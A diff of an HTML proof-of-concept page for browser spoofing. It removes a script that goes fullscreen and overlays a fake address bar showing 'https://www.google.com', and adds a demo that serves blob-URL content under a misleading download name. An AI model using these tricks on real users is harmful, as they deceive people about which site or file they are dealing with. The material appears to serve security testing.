@@ -3,42 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Address Bar Spoof PoC</title>
+    <title>Blob URL Spoofing Example</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        #result {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-    <h1>Click anywhere to test PoC</h1>
-</body>
-<script>
-    document.addEventListener("click", () => {
-        // Meminta layar penuh
-        document.documentElement.requestFullscreen();
 
-        // Meminta izin notifikasi
-        Notification.requestPermission().then((permission) => {
-            if (permission === "granted") {
-                // Membuat overlay UI palsu
-                const fakeAddressBar = document.createElement("div");
-                fakeAddressBar.style = `
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 40px;
-                    background-color: white;
-                    color: black;
-                    z-index: 9999;
-                    display: flex;
-                    align-items: center;
-                    padding: 0 10px;
-                    font-family: Arial, sans-serif;
-                    box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.3);
-                `;
-                fakeAddressBar.innerText = "https://www.google.com";
+    <h1>Blob URL Spoofing Demo</h1>
+    <p>Click the link below to see the spoofed download.</p>
+    <a id="spoofLink" href="#">Download Spoofed File</a>
+    <div id="result"></div>
 
-                // Menambahkan UI palsu ke halaman
-                document.body.appendChild(fakeAddressBar);
-            }
+    <script>
+        const spoofLink = document.getElementById('spoofLink');
+        const resultDiv = document.getElementById('result');
+
+        spoofLink.addEventListener('click', (event) => {
+            event.preventDefault(); // Prevent default anchor behavior
+            
+            // Content of the blob file
+            const fileContent = '<h1>This is a spoofed blob file!</h1><p>Downloaded from a blob URL.</p>';
+            const fileName = 'sensitive_data.txt'; // Intended file name
+
+            // Create a Blob object with the content
+            const blob = new Blob([fileContent], { type: 'text/html' });
+
+            // Create a URL for the blob
+            const blobURL = window.URL.createObjectURL(blob);
+            spoofLink.href = blobURL;
+
+            // Set download attribute after a slight delay to avoid immediate download
+            setTimeout(() => {
+                spoofLink.download = fileName;
+                resultDiv.textContent = 'You are about to download: ' + fileName;
+            }, 10);
         });
-    });
-</script>
+    </script>
+
+</body>
 </html>
